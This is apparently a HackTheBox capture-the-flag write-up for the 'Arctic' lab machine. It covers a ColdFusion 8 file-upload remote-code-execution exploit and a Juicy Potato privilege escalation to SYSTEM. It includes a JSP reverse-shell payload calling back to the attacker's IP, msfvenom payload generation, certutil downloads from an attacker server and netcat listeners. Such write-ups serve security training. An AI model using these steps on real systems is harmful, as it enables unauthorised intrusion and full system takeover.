# Arctic

## Introduction

Welcome to my another writeup! In this HackTheBox [Arctic](https://app.hackthebox.com/machines/Arctic) machine, you'll learn: Exploiting Adobe ColdFusion 8 Remote Code Execution (RCE) via file upload vulnerability, privilege escalation via abusing `SeImpersonatePrivilege` with Juicy Potato, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: arctic\\tolis to NT AUTHORITY\\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Arctic/images/Arctic.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|13:47:16(HKT)]
└> export RHOSTS=10.10.10.11           
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|13:47:19(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|13:47:23(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.10.11:135
Open 10.10.10.11:8500
Open 10.10.10.11:49154
[...]
PORT      STATE SERVICE REASON  VERSION
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|13:47:43(HKT)]
└> sudo nmap -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, the target machine has 3 port are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|135/TCP, 49154/TCP| Microsoft Windows RPC         |
|8500/TCP          | Unknown                       |

### RPC on TCP port 135

> Note: Microsoft Remote Procedure Call (RPC), also known as a function call or a subroutine call, is [a protocol](http://searchmicroservices.techtarget.com/definition/Remote-Procedure-Call-RPC) that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network. MSRPC was originally derived from open source software but has been developed further and copyrighted by Microsoft. (From [https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc))

In here, we can use [Impacket](https://github.com/fortra/impacket)'s `rpcdump` to enumerate the target's network.

**rcpdump:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|13:58:21(HKT)]
└> impacket-rpcdump $RHOSTS -p 135 | tee rpcdump.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.11
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.11[49152]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\ARCTIC[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc0839F0]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\ARCTIC[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc0839F0]
          ncalrpc:[WMsgKRpc086FB1]
[...]
Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Provider: msdtcprx.dll 
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
Bindings: 
          ncalrpc:[LRPC-c3625abe31a51a7ce3]
          ncalrpc:[OLE07D71D1BD18642BF9CA85D35BFF2]
          ncalrpc:[LRPC-5d05a4a5a843593836]
          ncalrpc:[LRPC-5d05a4a5a843593836]
          ncalrpc:[LRPC-5d05a4a5a843593836]
          ncalrpc:[LRPC-5d05a4a5a843593836]

[*] Received 98 endpoints.
```

Nothing useful.

### Unknown service on TCP port 8500

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:05:57(HKT)]
└> curl -s http://$RHOSTS:8500/ | html2text 
****** Index of / ******

===============================================================================
CFIDE/               dir   03/22/17 08:52 Î¼Î¼
cfdocs/              dir   03/22/17 08:55 Î¼Î¼
===============================================================================
```

Hmm? **TCP port 8500 is a web server**, and the webroot directory has 2 directories: `CFIDE/` and `cfdocs/`.

**`CFIDE/`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:08:33(HKT)]
└> curl -s http://$RHOSTS:8500/CFIDE/ | html2text
****** Index of /CFIDE/ ******

===============================================================================
Parent_..                                              dir   03/22/17 08:52
Î¼Î¼
Application.cfm                                       1151   03/18/08 11:06
ÏÎ¼
adminapi/                                              dir   03/22/17 08:53
Î¼Î¼
administrator/                                         dir   03/22/17 08:55
Î¼Î¼
classes/                                               dir   03/22/17 08:52
Î¼Î¼
componentutils/                                        dir   03/22/17 08:52
Î¼Î¼
debug/                                                 dir   03/22/17 08:52
Î¼Î¼
images/                                                dir   03/22/17 08:52
Î¼Î¼
install.cfm                                          12077   03/18/08 11:06
ÏÎ¼
multiservermonitor-access-policy.xml                   278   03/18/08 11:07
ÏÎ¼
probe.cfm                                            30778   03/18/08 11:06
ÏÎ¼
scripts/                                               dir   03/22/17 08:52
Î¼Î¼
wizards/                                               dir   03/22/17 08:52
Î¼Î¼
===============================================================================
```

**`cfdocs/`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:09:04(HKT)]
└> curl -s http://$RHOSTS:8500/cfdocs/ | html2text
****** Index of /cfdocs/ ******

===============================================================================
Parent_..                           dir   03/22/17 08:55 Î¼Î¼
copyright.htm                      3026   03/22/17 08:55 Î¼Î¼
dochome.htm                        2180   03/22/17 08:55 Î¼Î¼
getting_started/                    dir   03/22/17 08:55 Î¼Î¼
htmldocs/                           dir   03/22/17 08:55 Î¼Î¼
images/                             dir   03/22/17 08:55 Î¼Î¼
newton.js                          2028   03/22/17 08:55 Î¼Î¼
newton_ie.css                      3360   03/22/17 08:55 Î¼Î¼
newton_ns.css                      4281   03/22/17 08:55 Î¼Î¼
toc.css                             244   03/22/17 08:55 Î¼Î¼
===============================================================================
```

After Googling "what is TCP port 8500", "CFIDE", "cfdocs", and reading file `cfdocs/dochome.htm`, it's clear that this TCP port 8500 is a ***Adobe ColdFusion***:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Arctic/images/Pasted%20image%2020230802141043.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Arctic/images/Pasted%20image%2020230802141103.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Arctic/images/Pasted%20image%2020230802141121.png)

> Note: Adobe ColdFusion is a commercial rapid web-application development computing platform written in Java. ColdFusion was originally designed to make it easier to connect simple [HTML](https://en.wikipedia.org/wiki/HTML "HTML") pages to a [database](https://en.wikipedia.org/wiki/Database). (From [https://en.wikipedia.org/wiki/Adobe_ColdFusion](https://en.wikipedia.org/wiki/Adobe_ColdFusion))

Most importantly, based on HTM file `cfdocs/dochome.htm`, we now know that ***its version is 8.***

## Initial Foothold

**Armed with above information, we can search for public exploits via the offline version of Exploit-DB, `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:15:12(HKT)]
└> searchsploit adobe coldfusion 8
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                  | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                               | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                  | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code E | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserializatio | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                        | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting    | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities   | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                  | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass            | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploi | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection      | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasp | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query Str | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizard | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.c | cfm/webapps/33168.txt
--------------------------------------------------------------------- ---------------------------------
[...]
```

**In here, we can see there's a Remote Code/Command Execution (RCE) exploit in Adobe ColdFusion 8, let's mirror it:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:16:33(HKT)]
└> searchsploit -m 50057     
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
    Codes: CVE-2009-2265
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/siunam/ctf/htb/Machines/Arctic/50057.py
```

After reading through all the exploit code, this exploit Python script will exploit a **file upload vulnerability** in `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`, and uses null byte (`%00`) to bypass the extension filter:

**The flow of the exploit script:**

1. Generate a JSP reverse shell via `msfvenom`
2. Upload the JSP reverse shell via `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm` file upload vulnerability
3. Setup a netcat listener
4. Execute the uploaded reverse shell in `/userfiles/file/{filename}.jsp`
5. Profit

**But before we run the exploit, we need to change the `lhost`, or maybe `lport` variable:**
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.8'
    lport = 443
    rhost = "10.10.10.11"
    rport = 8500
```

**Then run the exploit script:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:23:41(HKT)]
└> python3 50057.py 

Generating a payload...
Payload size: 1495 bytes
Saved as: a8b0f6c3f98a496f816e77c8c98d81f2.jsp

Priting request...
Content-type: multipart/form-data; boundary=e2921372af2d435ab7839c8c1c22ad5a
Content-length: 1696

--e2921372af2d435ab7839c8c1c22ad5a
Content-Disposition: form-data; name="newfile"; filename="a8b0f6c3f98a496f816e77c8c98d81f2.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
[...]
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.8", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--e2921372af2d435ab7839c8c1c22ad5a--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/a8b0f6c3f98a496f816e77c8c98d81f2.jsp/a8b0f6c3f98a496f816e77c8c98d81f2.txt", "a8b0f6c3f98a496f816e77c8c98d81f2.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.8
lport: 443
rhost: 10.10.10.11
rport: 8500
payload: a8b0f6c3f98a496f816e77c8c98d81f2.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49324
[...]
C:\ColdFusion8\runtime\bin>whoami && ipconfig /all
arctic\tolis

Windows IP Configuration

   Host Name . . . . . . . . . . . . : arctic
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-F5-5E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.11(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
[...]
```

I'm user `arctic\tolis`!

**user.txt:**
```shell
C:\Users\tolis\Desktop>type user.txt
{Redacted}
```

## Privilege Escalation

### arctic\\tolis to NT AUTHORITY\\SYSTEM

After gaining initial foothold on the target machine, we can perform system enumerations to escalate our privilege.

**Local users:**
```shell
C:\ColdFusion8\runtime\bin>net user
[...]
-------------------------------------------------------------------------------
Administrator            Guest                    tolis                    
[...]
```

- Non-default user: `tolis`

**User `tolis` details:**
```shell
C:\ColdFusion8\runtime\bin>net user tolis
User name                    tolis
Full Name                    tolis
[...]
Local Group Memberships      *Users                
Global Group memberships     *None
```

Nothing useful, as `tolis` is only a member of local group `Users`. 

**System information:**
```shell
C:\ColdFusion8\runtime\bin>systeminfo
[...]
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
[...]
System Type:               x64-based PC
[...]
```

- Windows version: **Windows Server 2008 Build 7600**

Maybe we can exploit some Kernel Exploits (KE)?

**User `tolis`'s privilege:**
```shell
C:\ColdFusion8\runtime\bin>whoami /priv
[...]
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

User `tolis`' has `SeImpersonatePrivilege`. Maybe we can use **potato exploit** to escalate our privilege to SYSTEM?

**Unquoted service path:**
```shell
C:\ColdFusion8\runtime\bin>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
ColdFusion 8 .NET Service                               ColdFusion 8 .NET Service        C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe                                                                        Auto       
```

> Note: Unquoted service path is a vulnerability that the path to the service binary is not wrapped in quotes and there are spaces in the path.

Hmm... This service "ColdFusion 8 .NET Service" looks kinda interesting...

- **Check `CF8DotNetsvc.exe` permission:**
```shell
C:\ColdFusion8\runtime\bin>icacls C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe
C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe ARCTIC\tolis:(I)(F)
                                         NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Administrators:(I)(F)
                                         BUILTIN\Users:(I)(RX)
```

Ah ha, **User `tolis` has full control!** Which means we can overwrite `CF8DotNetsvc.exe`, and replace it with a reverse shell.

- **Check if `tolis` is able to restart service/machine:**

```shell
C:\ColdFusion8\runtime\bin>sc stop "ColdFusion 8 .NET Service"
[SC] OpenService FAILED 5:

Access is denied.


C:\ColdFusion8\runtime\bin>sc qc "ColdFusion 8 .NET Service"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: ColdFusion 8 .NET Service
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : ColdFusion 8 .NET Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```shell
C:\ColdFusion8\runtime\bin>whoami /priv
[...]
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Nope. The `SERVICE_START_NAME` is `LocalSystem`, which means **only SYSTEM user can restart the service**. Also, user `tolis` can't reboot the machine as this user **doesn't have `SeShutdownPrivilege`**, which is the permission to shut down/reboot the system. That being said, we can't escalate our privilege to SYSTEM via overwriting `CF8DotNetsvc.exe` binary.

Luckily, **user `tolis` has `SeImpersonatePrivilege`**, which means we can leverage **potato exploits** to escalate our privilege to SYSTEM!

According to [https://jlajara.gitlab.io/Potatoes_Windows_Privesc#tldr](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#tldr), if the Windows version is < Windows 10 1809 < Windows Server 2019, we can try to use **[Juicy Potato](https://github.com/ohpe/juicy-potato/)**.

- **Transfer [Juicy Potato executable](https://github.com/ohpe/juicy-potato/releases/) to the target machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:52:15(HKT)]
└> file /opt/juicy-potato/JuicyPotato.exe 
/opt/juicy-potato/JuicyPotato.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:52:19(HKT)]
└> python3 -m http.server -d /opt/juicy-potato/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
C:\ColdFusion8\runtime\bin>certutil -urlcache -split -f http://10.10.14.8/JuicyPotato.exe C:\Users\tolis\Desktop\JuicyPotato.exe
[...]
CertUtil: -URLCache command completed successfully.
```

- **Test the exploit:**

```shell
C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c whoami"
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

> Note: You can find a suitable CLSID in [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/).

It worked!

- **Generate a stageless reverse shell executable via `msfvenom`:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:57:15(HKT)]
└> msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o revshell_stageless_system.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: revshell_system.exe
```

- **Transfer the reverse shell:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|14:57:39(HKT)]
└> python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
C:\ColdFusion8\runtime\bin>certutil -urlcache -split -f http://10.10.14.8/revshell_stageless_system.exe C:\Users\tolis\Desktop\revshell_stageless_system.exe
[...]
CertUtil: -URLCache command completed successfully.
```

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|15:00:26(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
```

- **Test the reverse shell:**

```shell
C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\revshell_stageless_system.exe
C:\ColdFusion8\runtime\bin>
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|15:00:26(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49492
[...]
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

It worked!

- **Setup the netcat listener again and run the exploit with the reverse shell executable as the argument:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|15:01:36(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
```

```shell
C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c C:\Users\tolis\Desktop\revshell_stageless_system.exe"
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Arctic)-[2023.08.02|15:01:36(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49505
[...]
C:\Windows\system32>whoami && ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : arctic
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-F5-5E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.11(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
[...]
```

I'm now `NT AUTHORITY\SYSTEM`! :D

## Rooted

**root.txt:**
```shell
C:\Users\Administrator\Desktop>type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Arctic/images/Pasted%20image%2020230802150334.png)

## Conclusion

What we've learned:

1. Exploiting Adobe ColdFusion 8 Remote Code Execution (RCE) via file upload vulnerability
2. Vertical privilege escalation via abusing `SeImpersonatePrivilege` with Juicy Potato